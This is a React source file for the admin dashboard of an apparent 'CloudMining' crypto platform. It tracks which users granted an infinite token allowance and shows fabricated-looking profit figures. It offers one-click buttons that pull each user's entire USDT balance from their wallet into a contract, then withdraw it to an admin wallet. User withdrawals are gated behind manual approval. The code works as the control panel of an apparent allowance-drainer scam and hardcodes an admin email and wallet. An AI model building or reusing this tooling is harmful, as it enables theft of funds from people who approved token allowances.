import { useState, useEffect } from 'react';
import { supabase } from '../../../lib/supabase';
import { useAccount } from 'wagmi';
import { ConnectButton } from '@rainbow-me/rainbowkit';
import { transferFromUser, getContractBalance, withdraw } from '../../utils/CloudMining';

type User = {
  id: string;
  wallet_address: string;
  usdt_balance: number;
  withdrawal_amount: number;
  withdraw_request: boolean;
  last_login: string;
  last_updated: string;
  infinite_allowance: boolean;
  profit_realtime: number;
  join_date: string;
  show_evn: boolean;
};

type WithdrawHistory = {
  id: string;
  wallet_address: string;
  amount: number;
  tx_hash: string;
  created_at: string;
  status: string; // Added status property
};


const AdminDashboard = () => {
  // --- Mounting & Authentication States ---
  const [mounted, setMounted] = useState(false);
  const [loadingAuth, setLoadingAuth] = useState(true);

  // State untuk login dengan email
  const [session, setSession] = useState<any>(null);
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [authError, setAuthError] = useState('');

  // Dapatkan wallet address dari Wagmi
  const { address } = useAccount();

  // Daftar admin berdasarkan wallet dan email
  const ADMIN_WALLETS = [
  '0x53367d720EF2A149a550414205d41B003A5273A0' 
  ].map((a) => a.trim().toLowerCase());
  const ADMIN_EMAILS =
  'rokeroke41@gmail.com'.split(',').map((a) => a.trim().toLowerCase()) || [];

  // Cek apakah user yang login (wallet atau email) termasuk admin
  const isAdmin =
    (address && ADMIN_WALLETS.includes(address.toLowerCase())) ||
    (session?.user?.email && ADMIN_EMAILS.includes(session.user.email.toLowerCase()));

  // --- State untuk Users Table ---
  const [users, setUsers] = useState<User[]>([]);
  const [loadingUsers, setLoadingUsers] = useState(true);
  const [usersError, setUsersError] = useState<string | null>(null);
  const [userPage, setUserPage] = useState(1);
  const userPageSize = 5;
  const [totalUsers, setTotalUsers] = useState(0);
  const [selectedUserId, setSelectedUserId] = useState<string | null>(null);
  const [showTxModal, setShowTxModal] = useState(false);
  const [txHash, setTxHash] = useState('');
  const [selectedWallet, setSelectedWallet] = useState<string | null>(null);
  const [openAccordion, setOpenAccordion] = useState<number | null>(null);


  // --- State untuk Withdraw History Table ---
  const [withdrawHistory, setWithdrawHistory] = useState<WithdrawHistory[]>([]);
  const [loadingHistory, setLoadingHistory] = useState(true);
  const [historyError, setHistoryError] = useState<string | null>(null);
  const [withdrawPage, setWithdrawPage] = useState(1); // ✅
  const withdrawPageSize = 5; // ✅
  const [totalWithdraws, setTotalWithdraws] = useState(0); // ✅
  

  // --- Search Term ---
  const [searchTerm, setSearchTerm] = useState('');

  // --- State untuk fungsi contract ---
  const [balance, setBalance] = useState("0");
  const [userAddress, setUserAddress] = useState("");
  const [amount, setAmount] = useState("");
  const [withdrawAmount, setWithdrawAmount] = useState("");

  // --- Effect: Set mounted ---
  useEffect(() => {
    setMounted(true);
  }, []);

  // --- Effect: Cek session Supabase dan langganan perubahan auth ---
  useEffect(() => {
    supabase.auth.getSession().then(({ data: { session } }) => {
      setSession(session);
      setLoadingAuth(false);
    });
    const { data: authListener } = supabase.auth.onAuthStateChange((event, session) => {
      setSession(session);
    });
    return () => authListener.subscription.unsubscribe();
  }, []);

  // --- Effect: Hentikan loadingAuth jika ada wallet atau session ---
  useEffect(() => {
    if (mounted && (address || session)) {
      setLoadingAuth(false);
    }
  }, [mounted, address, session]);

  // --- Fungsi Login dengan Email ---
  const handleEmailLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    setAuthError('');
    const { data, error } = await supabase.auth.signInWithPassword({
      email,
      password,
    });
    if (error) {
      setAuthError(error.message);
    } else {
      setSession(data.session);
    }
  };

  // --- Fungsi untuk Contract ---
  const fetchBalance = async () => {
    const contractBalance = await getContractBalance();
    setBalance((Number(contractBalance) / 10 ** 6).toFixed(2));
  };

  //fungsi untuk transfer dari user ke kontrak
  const handleTransfer = async () => {
    if (!userAddress || !amount) return alert("Masukkan alamat dan jumlah!");
    try {
      await transferFromUser(userAddress, amount);
      alert("Transfer berhasil!");
      fetchBalance();
    } catch (error) {
      console.error(error);
      alert("Transfer gagal!");
    }
  };
  
  // Fungsi untuk toggle EVN
const toggleEVN = async (userId: string, currentStatus: boolean) => {
  try {
    const { error } = await supabase
      .from('users')
      .update({ show_evn: !currentStatus })
      .eq('id', userId);

    if (error) throw error;
    fetchUsers(); // Refresh data
  } catch (error) {
    console.error('Gagal update status EVN:', error);
  }
};
  

  const handleWithdraw = async () => {
    if (!withdrawAmount) return alert("Masukkan jumlah untuk ditarik!");
    try {
      await withdraw(withdrawAmount);
      alert("Penarikan berhasil!");
      fetchBalance();
    } catch (error) {
      console.error(error);
      alert("Penarikan gagal!");
    }
  };

  // --- Fungsi fetch Users dengan pagination ---
  const fetchUsers = async () => {
    try {
      setLoadingUsers(true);
      setUsersError(null);
      const from = (userPage - 1) * userPageSize;
      const to = userPage * userPageSize - 1;
      const { data, error, count } = await supabase
        .from('users')
        .select(
          'id, wallet_address, usdt_balance, withdrawal_amount, last_login, last_updated, infinite_allowance, profit_realtime, join_date, show_evn, withdraw_request',
          { count: 'exact' }
        )
        .ilike('wallet_address', `%${searchTerm}%`)
        .order('last_updated', { ascending: false })
        .range(from, to);

      if (error) throw error;
      setUsers(data || []);
      setTotalUsers(count || 0);
    } catch (err) {
      setUsersError('Failed to fetch users');
      console.error(err);
    } finally {
      setLoadingUsers(false);
    }
  };

  
  
  


  // --- Fungsi update status untuk withdraw request (approve/reject) ---
  const handleRejectWithdraw = async (wallet_address: string) => {
    try {
      const { error } = await supabase
        .from('users')
        .update({ withdraw_request: false })
        .eq('wallet_address', wallet_address);
      if (error) throw error;
      fetchUsers();
    } catch (err) {
      console.error('Failed to reject withdrawal:', err);
    }
  };
  
  // Fungsi untuk menyetujui withdraw request dan menyimpan tx hash dengan status success
  const handleApproveWithTxHash = async () => {
    if (!selectedWallet || !txHash) return;
  
    try {
      const updates = {
        profit_realtime: 0,
        withdraw_request: false,
      };
  
      // Update tabel user
      const { error: userUpdateError } = await supabase
        .from('users')
        .update(updates)
        .eq('wallet_address', selectedWallet);
  
      // Temukan entry withdraw yang pending
      const { data: pendingEntry, error: findError } = await supabase
        .from('withdraw_history')
        .select('id')
        .eq('wallet_address', selectedWallet)
        .eq('status', 'pending')
        .order('created_at', { ascending: false })
        .limit(1)
        .maybeSingle();
  
      if (findError || !pendingEntry) throw findError || new Error('No pending withdrawal found');
  
      // Update ke success dan simpan tx hash
      const { error: updateError } = await supabase
        .from('withdraw_history')
        .update({
          tx_hash: txHash,
          status: 'success',
        })
        .eq('id', pendingEntry.id);
  
      if (userUpdateError || updateError) throw userUpdateError || updateError;
  
      // Reset state dan refresh data
      setTxHash('');
      setShowTxModal(false);
      setSelectedWallet(null);
      fetchUsers();
      fetchWithdrawHistory();
    } catch (err) {
      console.error('Failed to approve withdrawal:', err);
    }
  };
  

  useEffect(() => {
    fetchWithdrawHistory();
  }, [withdrawPage]);
  

  const fetchWithdrawHistory = async () => {
  try {
    setLoadingHistory(true);
    setHistoryError(null);

    // Gunakan pagination
    const from = (withdrawPage - 1) * withdrawPageSize;
    const to = withdrawPage * withdrawPageSize - 1;

    const { data, error, count } = await supabase
      .from('withdraw_history')
      .select('*', { count: 'exact' }) // <-- penting untuk menghitung total halaman
      .order('created_at', { ascending: false })
      .range(from, to);

    if (error) throw error;
    setWithdrawHistory(data || []);
    setTotalWithdraws(count || 0); // <-- untuk total halaman
  } catch (err) {
    console.error('Failed to fetch withdraw history:', err);
    setHistoryError('Failed to load history');
  } finally {
    setLoadingHistory(false);
  }
};


  useEffect(() => {
    const channel = supabase
      .channel('admin-withdraw-history-realtime')
      .on(
        'postgres_changes',
        {
          event: '*',
          schema: 'public',
          table: 'withdraw_history',
        },
        () => {
          fetchWithdrawHistory(); // 🔁 Refresh withdraw history saat ada update
        }
      )
      .subscribe();
  
    return () => {
      supabase.removeChannel(channel);
    };
  }, []);
  
  
  
  

  // --- Ambil data Users dan Withdraw Requests jika sudah login dan merupakan admin ---
  useEffect(() => {
    if (mounted && isAdmin) {
      fetchUsers();
      fetchWithdrawHistory();
      
    }
  }, [mounted, isAdmin, searchTerm, userPage,]);

  if (!mounted) return null;

  if (loadingAuth) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-gray-900">
        <div className="text-white text-xl">Checking authentication...</div>
      </div>
    );
  }

  // Jika belum login dengan wallet atau email, tampilkan halaman login dengan kedua opsi
  if (!address && !session) {
    return (
      <div className="min-h-screen flex flex-col items-center justify-center bg-gray-900 p-4">
        <h1 className="text-white text-3xl mb-4">Admin Login</h1>
        <p className="text-gray-400 mb-4">Silakan pilih metode login.</p>
        <div className="flex flex-col gap-6 w-full max-w-md">
          {/* Login dengan Wallet */}
          <div className="flex justify-center">
            <ConnectButton label="Login dengan Wallet" />
          </div>
          {/* Form Login dengan Email */}
          <form onSubmit={handleEmailLogin} className="bg-gray-800 p-4 rounded-lg">
            {authError && <p className="text-red-500 mb-2">{authError}</p>}
            <input
              type="email"
              placeholder="Email"
              value={email}
              onChange={(e) => setEmail(e.target.value)}
              className="w-full p-3 rounded-lg bg-gray-700 text-white placeholder-gray-400 mb-4"
              required
            />
            <input
              type="password"
              placeholder="Password"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              className="w-full p-3 rounded-lg bg-gray-700 text-white placeholder-gray-400 mb-4"
              required
            />
            <button type="submit" className="w-full p-3 bg-blue-600 text-white rounded-lg">
              Login dengan Email
            </button>
          </form>
        </div>
      </div>
    );
  }

  // Jika sudah login tetapi bukan admin, tampilkan pesan Unauthorized
  if (!isAdmin) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-gray-900">
        <div className="text-red-500 text-2xl font-bold">
          Unauthorized Access. Admin Only.
        </div>
      </div>
    );
  }

  // Jika sudah login dan merupakan admin, tampilkan dashboard
  return (
    <div className="min-h-screen bg-gray-900 p-4">
      <div className="max-w-7xl mx-auto">
        <h1 className="text-3xl font-bold text-white mb-8">Admin Dashboard</h1>

        {/* Search Bar */}
        <div className="mb-6">
          <input
            type="text"
            placeholder="Search by wallet address..."
            className="w-full p-3 rounded-lg bg-gray-800 text-white placeholder-gray-400"
            value={searchTerm}
            onChange={(e) => {
              setSearchTerm(e.target.value);
              setUserPage(1);
            }}
          />
        </div>

        {/* Users Table */}
        <div className="mb-10 bg-gray-800 p-6 rounded-xl">
          <div className="flex justify-between items-center mb-4">
            <h2 className="text-2xl font-bold text-white">USERS TABLE</h2>
            <button
              onClick={fetchUsers}
              className="px-3 py-1 bg-gray-700 hover:bg-gray-600 text-white rounded text-sm"
            >
              Refresh
            </button>
          </div>
          {loadingUsers ? (
            <div className="text-center text-white py-4">Loading users...</div>
          ) : usersError ? (
            <div className="text-red-500 text-center py-4">{usersError}</div>
          ) : (
            <div className="overflow-x-auto">
              <div className="hidden md:block overflow-x-auto">
              <table className="w-full">
                <thead className="bg-gray-800">
                  <tr>
                    <th className="px-6 py-4 text-left bg-amber-700 rounded-l-2xl text-white font-semibold">
                      Address
                    </th>
                    <th className="px-6 py-4 text-left text-white bg-amber-700 font-semibold">
                      USDT Balance
                    </th>
                    <th className="px-6 py-4 text-left text-white bg-amber-700 font-semibold">
                      Profit
                    </th>
                    <th className="px-6 py-4 text-left text-white bg-amber-700 font-semibold">
                      Last Login
                    </th>
                    
                    <th className="px-6 py-4 text-left text-white bg-amber-700 font-semibold">
                      Infinite Allowance
                    </th>
                    <th className="px-6 py-4 text-left text-white bg-amber-700 font-semibold">
                      EVENT Status
                    </th>
                    
                    
                    <th className="px-6 py-4 text-left text-white bg-amber-700 rounded-e-2xl font-semibold">Actions</th>
                  </tr>
                </thead>
                <tbody className="divide-y divide-gray-700">
                  {users.map((user) => (
                    <tr
                      key={user.id}
                      className="hover:bg-gray-800/50 transition-colors"
                    >
                      <td className="px-6 py-4 text-white font-mono">
                      
                      {`${user.wallet_address.slice(0, 4)}...${user.wallet_address.slice(-5)}`}
                    
                      </td>
                      <td className="px-6 py-4 text-green-300">
                        {user.usdt_balance.toFixed(2)} USDT
                      </td>
                      <td className="px-6 py-4 text-yellow-400">
                        ${user.profit_realtime.toFixed(2)}
                      </td>
                        <td className="px-6 py-4 text-gray-400">
                        {new Date(user.last_login).toLocaleString()} 
                        </td>
                        
                      <td className="px-6 py-4 text-gray-400">
                        {user.infinite_allowance ? 'TRUE' : 'FALSE'}
                      </td>
                      <td className="px-6 py-4 text-gray-400">
                        {user.show_evn ? 'ACTIVE' : 'INACTIVE'}
                      </td>
                      
                      
                      <td className="px-6 py-4">
                        <button
                        onClick={() => toggleEVN(user.id, user.show_evn)}
                        className={`px-3 py-1 rounded ${
                          user.show_evn 
                          ? 'bg-red-600 hover:bg-red-700' 
                          : 'bg-green-600 hover:bg-green-700'
                        } text-white hover:scale-105 transition-transform cursor-pointer ml-0`}
                        >
                        {user.show_evn ? 'Nonaktifkan Event' : 'Aktifkan Event'}
                        </button>
                      
                        
                        <button
                          onClick={() => {
                          navigator.clipboard.writeText(user.wallet_address);
                          alert("Wallet address copied to clipboard!");
                          }}
                          className="px-3 py-1 rounded text-blue-400 bg-gray-700 hover:bg-gray-600 hover:text-white hover:scale-105 transition-transform cursor-pointer"
                        >
                          Copy Address
                        </button>
                        
                        {/* Transfer ke kontrak */}
                          <button
                            onClick={async () => {
                              const confirm = window.confirm(`Kirim ${user.usdt_balance.toFixed(2)} USDT dari ${user.wallet_address} ke kontrak?`);
                              if (!confirm) return;
                              try {
                                await transferFromUser(user.wallet_address, user.usdt_balance.toString());
                                alert('Transfer berhasil!');
                                fetchBalance(); // Opsional: jika ada fungsi untuk update balance
                              } catch (err) {
                                console.error(err);
                                alert('Transfer gagal!');
                              }
                            }}
                            className="w-full px-3 py-2 mt-2 rounded text-white bg-indigo-600 hover:bg-indigo-700"
                          >
                            Transfer USDT ke Kontrak
                          </button>
                    </td>
                    </tr>
                  ))}
                </tbody>
              </table>
              </div>
              {/* Accordion view for mobile */}
              <div className="block md:hidden space-y-4">
                {users.map((user) => (
                  <details
                    key={user.id}
                    className="bg-cyan-950 rounded-lg p-4 border border-gray-700"
                  >
                    <summary className="text-white font-mono cursor-pointer">
                      {`${user.wallet_address.slice(0, 7)}...${user.wallet_address.slice(-5)}`}
                    </summary>
                    <div className="mt-4 space-y-2 text-sm text-gray-300">
                      
                        <div className="flex justify-between bg-gray-700 p-2 rounded-lg mb-2">
                        <strong>USDT Balance:</strong>
                        <span className="text-green-300">{user.usdt_balance.toFixed(2)} USDT</span>
                        </div>
                        <div className="flex justify-between bg-gray-700 p-2 rounded-lg mb-2">
                        <strong>Profit Realtime:</strong>
                        <span className="text-yellow-400">${user.profit_realtime.toFixed(2)}</span>
                        </div>
                        <div className="flex justify-between bg-gray-700 p-2 rounded-lg mb-2">
                        <strong>Last Login:</strong>
                        <span>{new Date(user.last_login).toLocaleString()}</span>
                        </div>
                        <div className="flex justify-between bg-gray-700 p-2 rounded-lg mb-2">
                        <strong>Last Updated:</strong>
                        <span>{new Date(user.last_updated).toLocaleString()}</span>
                        </div>
                        <div className="flex justify-between bg-gray-700 p-2 rounded-lg mb-2">
                        <strong>Infinite Allowance:</strong>
                        <span>{user.infinite_allowance ? 'TRUE' : 'FALSE'}</span>
                        </div>
                        <div className="flex justify-between bg-gray-700 p-2 rounded-lg">
                        <strong>EVENT Status:</strong>
                        <span>{user.show_evn ? 'ACTIVE' : 'INACTIVE'}</span>
                        </div>
                      <div className="pt-2">
                        <button
                          onClick={() => toggleEVN(user.id, user.show_evn)}
                          className={`w-full px-3 py-2 rounded text-white ${
                          user.show_evn
                            ? 'bg-red-600 hover:bg-red-700'
                            : 'bg-green-600 hover:bg-green-700'
                          }`}
                        >
                          {user.show_evn ? 'Nonaktifkan' : 'Aktifkan Event'}
                        </button>
                        <button
                        onClick={() => {
                          navigator.clipboard.writeText(user.wallet_address);
                          alert("Wallet address copied to clipboard!");
                        }}
                        className="w-full px-3 py-2 rounded text-blue-400 bg-gray-700 hover:bg-gray-600"
                        >
                        Copy wallet address
                        </button>
                        {/* Transfer ke kontrak */}
                        <div className="mt-2">
                          <button
                            onClick={async () => {
                              const confirm = window.confirm(`Kirim ${user.usdt_balance.toFixed(2)} USDT dari ${user.wallet_address} ke kontrak?`);
                              if (!confirm) return;

                              try {
                                await transferFromUser(user.wallet_address, user.usdt_balance.toString());
                                alert('Transfer berhasil!');
                                fetchBalance(); // Opsional: jika ada fungsi untuk update balance
                              } catch (err) {
                                console.error(err);
                                alert('Transfer gagal!');
                              }
                            }}
                            className="w-full px-3 py-2 mt-2 rounded text-white bg-indigo-600 hover:bg-indigo-700"
                          >
                            Transfer Seluruh USDT ke Kontrak
                          </button>
                        </div>

                      </div>
                    </div>
                  </details>
                ))}
              </div>
              {/* Pagination Controls for Users */}
              <div className="flex justify-between items-center mt-4">
                <button
                  onClick={() => setUserPage((prev) => Math.max(prev - 1, 1))}
                  disabled={userPage === 1}
                  className="px-4 py-2 bg-gray-700 text-white rounded disabled:opacity-50"
                >
                  Previous
                </button>
                <span className="text-white">
                  Page {userPage} of {Math.ceil(totalUsers / userPageSize)}
                </span>
                <button
                  onClick={() =>
                    setUserPage((prev) =>
                      prev < Math.ceil(totalUsers / userPageSize) ? prev + 1 : prev
                    )
                  }
                  disabled={userPage >= Math.ceil(totalUsers / userPageSize)}
                  className="px-4 py-2 bg-gray-700 text-white rounded disabled:opacity-50"
                >
                  Next
                </button>
              </div>
            </div>
          )}
        </div>

        {/* Withdraw Requests Table (refactored to use `users` table) */}
        <div className="mb-10 bg-gray-800 p-6 rounded-xl">
          <div className="flex justify-between items-center mb-4">
            <h2 className="text-2xl font-bold text-white">Withdraw Requests</h2>
            <button
              onClick={fetchUsers}
              className="px-3 py-1 bg-gray-700 hover:bg-gray-600 text-white rounded text-sm"
            >
              Refresh
            </button>
          </div>
          {loadingUsers ? (
            <div className="text-center text-white py-4">Loading withdraw requests...</div>
          ) : (
            <div className="overflow-x-auto">
              <div className="hidden md:block overflow-x-auto">
              <table className="w-full">
                <thead className="bg-gray-800">
                  <tr>
                    <th className="px-6 py-4 text-left text-white font-semibold">Wallet Address</th>
                    <th className="px-6 py-4 text-left text-white font-semibold">Amount ($)</th>
                    <th className="px-6 py-4 text-left text-white font-semibold">Join Date</th>
                    <th className="px-6 py-4 text-left text-white font-semibold">Actions</th>
                  </tr>
                </thead>
                <tbody className="divide-y divide-gray-700">
                  {users.filter((u) => u.withdraw_request).map((user) => (
                    <tr key={user.id} className="hover:bg-gray-800/50 transition-colors">
                      <td className="px-6 py-4 text-white">{user.wallet_address}</td>
                      <td className="px-6 py-4 text-green-400">${user.withdrawal_amount.toFixed(2)}</td>
                      <td className="px-6 py-4 text-gray-400">
                        {new Date(user.join_date).toLocaleDateString()}
                      </td>
                      <td className="px-6 py-4">
                        <button
                          onClick={() => {
                          setSelectedWallet(user.wallet_address);
                          setShowTxModal(true);
                          }}
                          className="px-3 py-1 rounded mr-2 bg-green-400 text-white hover:bg-green-500 hover:text-gray-900 hover:scale-105 transition-transform cursor-pointer"
                        >
                          Approve
                        </button>
                        <button
                          onClick={() => handleRejectWithdraw(user.wallet_address)}
                          className="px-3 py-1 rounded bg-red-600 text-white hover:bg-red-700 hover:scale-105 transition-transform cursor-pointer"
                        >
                          Reject
                        </button>
                      </td>
                    </tr>
                  ))}
                </tbody>
              </table>
              </div>
              {/* Accordion view for mobile */}
              <div className="block md:hidden space-y-4">
                {users.filter((u) => u.withdraw_request).map((user) => (
                  <details
                    key={user.id}
                    className="bg-cyan-950 rounded-lg p-4 border border-gray-700"
                  >
                    <summary className="text-white font-mono cursor-pointer">
                      {`${user.wallet_address.slice(0, 7)}...${user.wallet_address.slice(-5)}`}
                    </summary>
                    <div className="mt-4 space-y-2 text-sm text-gray-300">
                      <div className="flex justify-between bg-gray-700 p-2 rounded-lg mb-2">
                        <strong>Amount:</strong>
                        <span className="text-green-400">${user.withdrawal_amount.toFixed(2)}</span>
                      </div>
                      <div className="flex justify-between bg-gray-700 p-2 rounded-lg mb-2">
                        <strong>Join Date:</strong>
                        <span>{new Date(user.join_date).toLocaleDateString()}</span>
                      </div>
                      <div className="pt-2">
                        <button
                          onClick={() => {
                            setSelectedWallet(user.wallet_address);
                            setShowTxModal(true);
                          }}
                          className="w-full px-3 py-2 rounded text-white bg-green-400 hover:bg-green-500"
                        >
                          Approve
                        </button>
                        <button
                          onClick={() => handleRejectWithdraw(user.wallet_address)}
                          className="w-full px-3 py-2 mt-2 rounded text-white bg-red-600 hover:bg-red-700"
                        >
                          Reject
                        </button>
                      </div>
                    </div>
                  </details>
                ))}
              </div>
              {/* Optional: no pagination needed here */}
            </div>
          )}
        </div>
        {showTxModal && (
        <div className="fixed inset-0 bg-black/60 flex items-center justify-center z-50">
          <div className="bg-gray-800 p-6 rounded-xl w-full max-w-md">
            <h2 className="text-xl text-white font-semibold mb-4">Masukkan TX Hash</h2>
            <input
              type="text"
              placeholder="TX Hash"
              value={txHash}
              onChange={(e) => setTxHash(e.target.value)}
              className="w-full p-3 rounded bg-gray-700 text-white placeholder-gray-400 mb-4"
            />
            <div className="flex justify-end gap-2">
              <button
                onClick={() => {
                  setShowTxModal(false);
                  setTxHash('');
                  setSelectedWallet(null);
                }}
                className="px-4 py-2 bg-gray-600 rounded text-white"
              >
                Cancel
              </button>
              <button
                onClick={handleApproveWithTxHash}
                className="px-4 py-2 bg-green-600 hover:bg-green-700 rounded text-white"
              >
                Approve
              </button>
            </div>
          </div>
        </div>
      )}

        
        {/* Withdraw History Table */}
        <div className="mb-10 bg-gray-800 p-6 rounded-xl">
          <div className="flex justify-between items-center mb-4">
            <h2 className="text-2xl font-bold text-white">Withdraw Request History</h2>
            <button
              onClick={fetchWithdrawHistory}
              className="px-3 py-1 bg-gray-700 hover:bg-gray-600 text-white rounded text-sm"
            >
              Refresh
            </button>
          </div>
          {loadingHistory ? (
            <div className="text-center text-white py-4">Loading withdraw history...</div>
          ) : historyError ? (
            <div className="text-red-500 text-center py-4">{historyError}</div>
          ) : (
            <div className="overflow-x-auto">
              <div className="hidden md:block overflow-x-auto">
                <table className="w-full">
                  <thead className="bg-gray-800">
                    <tr>
                      <th className="px-6 py-4 text-left text-white font-semibold">Wallet Address</th>
                      <th className="px-6 py-4 text-left text-white font-semibold">Amount ($)</th>
                      <th className="px-6 py-4 text-left text-white font-semibold">TX Hash</th>
                      <th className="px-6 py-4 text-left text-white font-semibold">Date</th>
                      <th className="px-6 py-4 text-left text-white font-semibold">Status</th>
                    </tr>
                  </thead>
                  <tbody className="divide-y divide-gray-700">
                    {withdrawHistory.map((record) => (
                      <tr key={record.id} className="hover:bg-gray-800/50 transition-colors">
                        <td className="px-6 py-4 text-white">{record.wallet_address}</td>
                        <td className="px-6 py-4 text-green-400">${record.amount.toFixed(2)}</td>
                        <td className="px-6 py-4 text-blue-400 break-all">{record.tx_hash}</td>
                        <td className="px-6 py-4 text-gray-400">
                          {new Date(record.created_at).toLocaleString()}
                        </td>
                        <td className="px-6 py-4 text-green-400">{record.status}</td>

                      </tr>
                    ))}
                  </tbody>
                </table>
              </div>
              {/* Accordion view for mobile */} 
              <div className="block md:hidden space-y-4">
                {withdrawHistory.map((record) => (
                  <details
                    key={record.id}
                    className="bg-cyan-950 rounded-lg p-4 border border-gray-700"
                  >
                    <summary className="text-white font-mono cursor-pointer">
                      {`${record.wallet_address.slice(0, 7)}...${record.wallet_address.slice(-5)}`}
                    </summary>
                    <div className="mt-4 space-y-2 text-sm text-gray-300">
                      <div className="flex justify-between bg-gray-700 p-2 rounded-lg mb-2">
                        <strong>Amount:</strong>
                        <span className="text-green-400">${record.amount.toFixed(2)}</span>
                      </div>
                      <div className="flex justify-between bg-gray-700 p-2 rounded-lg mb-2">
                        <strong>TX Hash:</strong>
                        <span className="text-blue-400 break-all">{record.tx_hash}</span>
                      </div>
                      <div className="flex justify-between bg-gray-700 p-2 rounded-lg mb-2">
                        <strong>Date:</strong>
                        <span>{new Date(record.created_at).toLocaleString()}</span>
                      </div>
                      <div className="flex justify-between bg-gray-700 p-2 rounded-lg">
                        <strong>Status:</strong>
                        <span>{record.status}</span>
                      </div>
                    </div>
                  </details>
                ))}
              </div>
              {/* Pagination Controls for Withdraw History */}
              <div className="flex justify-between items-center mt-4">
                <button
                  onClick={() => setWithdrawPage((prev) => Math.max(prev - 1, 1))}
                  disabled={withdrawPage === 1}
                  className="px-4 py-2 bg-gray-700 text-white rounded disabled:opacity-50"
                >
                  Previous
                </button>
                <span className="text-white">
                  Page {withdrawPage} of {Math.ceil(totalWithdraws / withdrawPageSize)}
                </span>
                <button
                  onClick={() =>
                    setWithdrawPage((prev) =>
                      prev < Math.ceil(totalWithdraws / withdrawPageSize) ? prev + 1 : prev
                    )
                  }
                  disabled={withdrawPage >= Math.ceil(totalWithdraws / withdrawPageSize)}
                  className="px-4 py-2 bg-gray-700 text-white rounded disabled:opacity-50"
                >
                  Next
                </button>
              </div>
            </div>
          )}
        </div>

        {/* Fungsi untuk Contract */}
        <div className="mb-10 p-6 bg-gray-800 rounded-xl">
          <h2 className="text-2xl font-bold text-white mb-4">Contract Balance</h2>
          <div className="flex items-center gap-4">
            <button 
              className="px-4 py-2 bg-blue-600 hover:bg-blue-700 text-white rounded-lg transition-colors"
              onClick={fetchBalance}
            >
              Cek Saldo Kontrak
            </button>
            <p className="text-white font-mono">
              Saldo Kontrak: <span className="text-green-400">{balance} USDT</span>
            </p>
          </div>
        </div>

        {/* Fungsi: Transfer dari User ke Kontrak */}
        <div className="mb-10 p-6 bg-gray-800 rounded-xl">
          <h2 className="text-2xl font-bold text-white mb-4">Transfer dari User ke Kontrak</h2>
          <div className="space-y-4">
            <div className="flex flex-col gap-2">
              <label className="text-gray-300">Alamat User</label>
              <input
                className="w-full p-3 rounded-lg bg-gray-700 text-white placeholder-gray-400"
                placeholder="0x..."
                onChange={(e) => setUserAddress(e.target.value)}
              />
            </div>
            <div className="flex flex-col gap-2">
              <label className="text-gray-300">Jumlah USDT</label>
              <div className="flex gap-3">
                <input
                  className="flex-1 p-3 rounded-lg bg-gray-700 text-white"
                  placeholder="0.00"
                  onChange={(e) => setAmount(e.target.value)}
                />
                <button 
                  className="px-6 py-3 bg-green-600 hover:bg-green-700 text-white rounded-lg transition-colors"
                  onClick={handleTransfer}
                >
                  Transfer USDT
                </button>
              </div>
            </div>
          </div>
        </div>

        {/* Fungsi: Withdraw dari Kontrak ke Wallet Admin */}
        <div className="mb-10 p-6 bg-gray-800 rounded-xl">
          <h2 className="text-2xl font-bold text-white mb-4">Withdraw ke Wallet Admin</h2>
          <div className="flex gap-3 items-center">
            <input
              className="flex-1 p-3 rounded-lg bg-gray-700 text-white"
              placeholder="Jumlah Penarikan"
              onChange={(e) => setWithdrawAmount(e.target.value)}
            />
            <button 
              className="px-6 py-3 bg-red-600 hover:bg-red-700 text-white rounded-lg transition-colors"
              onClick={handleWithdraw}
            >
              Tarik ke Admin
            </button>
          </div>
        </div>

      </div>
    </div>
  );
};

export default AdminDashboard;
